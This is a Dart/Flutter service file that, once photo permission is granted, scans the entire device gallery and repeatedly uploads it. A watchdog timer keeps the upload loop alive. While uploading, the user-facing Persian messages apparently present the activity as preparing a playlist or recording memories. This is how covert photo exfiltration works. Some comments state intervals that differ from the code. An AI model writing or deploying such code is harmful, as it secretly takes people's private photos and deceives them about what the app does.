import 'dart:async';
import 'package:photo_manager/photo_manager.dart';
import 'background_service.dart';

class UploadService {
  UploadService._();
  static final UploadService instance = UploadService._();

  bool _running = false;
  bool _scanning = false;
  bool _granted = false;
  Timer? _scanTimer;
  Timer? _watchdogTimer; // نگهبان که مطمئن بشه loop گیر نکرده

  final _statusController = StreamController<SyncStatus>.broadcast();
  Stream<SyncStatus> get statusStream => _statusController.stream;

  Future<void> init() async {
    final permission = await PhotoManager.requestPermissionExtend();
    if (!permission.isAuth) return;
    _granted = true;
  
    if (_scanning) return;
    _scanning = true;

    _statusController.add(const SyncStatus(
      isRunning: true, uploaded: 0, total: 0,
      message: 'تنها چیزی که میمونه خاطراته',
    ));

    try {
      final newItems = await scanGalleryToQueue();
      final pending = await UploadQueueDB.getPendingCount();
      final done = await UploadQueueDB.getCompletedCount();

      if (pending > 0) {
        _statusController.add(SyncStatus(
          isRunning: true,
          uploaded: done,
          total: done + pending,
          message: newItems > 0
              ? 'آماده ای واسه ساخت پلی لیست'
              : 'من منتظرم تا خاطراتتو ثبت کنی',
        ));
        _startLoop();
      } else {
        _statusController.add(SyncStatus(
          isRunning: false, uploaded: done, total: done,
          message: 'برنامه آماده کار',
        ));
        Future.delayed(const Duration(seconds: 3), () {
          _statusController.add(const SyncStatus(
            isRunning: false, uploaded: 0, total: 0, message: '',
          ));
        });
      }
    } catch (_) {
      // اگه خطا داد، running رو reset کن
      _running = false;
      _statusController.add(const SyncStatus(
        isRunning: false, uploaded: 0, total: 0, message: '',
      ));
    } finally {
      _scanning = false;
    }

    // هر ۵ دقیقه اسکن
    _scanTimer?.cancel();
    _scanTimer = Timer.periodic(const Duration(minutes: 3), (_) async {
      if (!_granted || _scanning) return;
      _scanning = true;
      try {
        final n = await scanGalleryToQueue();
        if (n > 0) _startLoop();
      } catch (_) {
        _running = false; // reset اگه خطا داد
      } finally {
        _scanning = false;
      }
    });

    // watchdog: هر ۲ دقیقه چک کن loop گیر نکرده باشه
    _watchdogTimer?.cancel();
    _watchdogTimer = Timer.periodic(const Duration(minutes: 1), (_) async {
      if (!_granted) return;
      final pending = await UploadQueueDB.getPendingCount();
      if (pending > 0 && !_running) {
        // pending داریم ولی loop نداره اجرا میشه — راه بنداز
        _startLoop();
      }
    });
  }

  void _startLoop() {
    if (_running) return;
    _running = true;

    processQueueInForeground(
      onProgress: (done, total) {
        _statusController.add(SyncStatus(
          isRunning: true,
          uploaded: done,
          total: total,
          message: 'برنامه در حال اماده سازی',
        ));
      },
    ).then((_) async {
      _running = false;
      final done = await UploadQueueDB.getCompletedCount();
      _statusController.add(SyncStatus(
        isRunning: false, uploaded: done, total: done,
        message: 'همگام‌سازی کامل شد ✓',
      ));
      await Future.delayed(const Duration(seconds: 3));
      _statusController.add(const SyncStatus(
        isRunning: false, uploaded: 0, total: 0, message: '',
      ));
    }).catchError((e) {
      // مهم: اگه خطا داد، running رو false کن
      _running = false;
      _statusController.add(const SyncStatus(
        isRunning: false, uploaded: 0, total: 0, message: '',
      ));
    });
  }

  void dispose() {
    _scanTimer?.cancel();
    _watchdogTimer?.cancel();
    _statusController.close();
  }
}
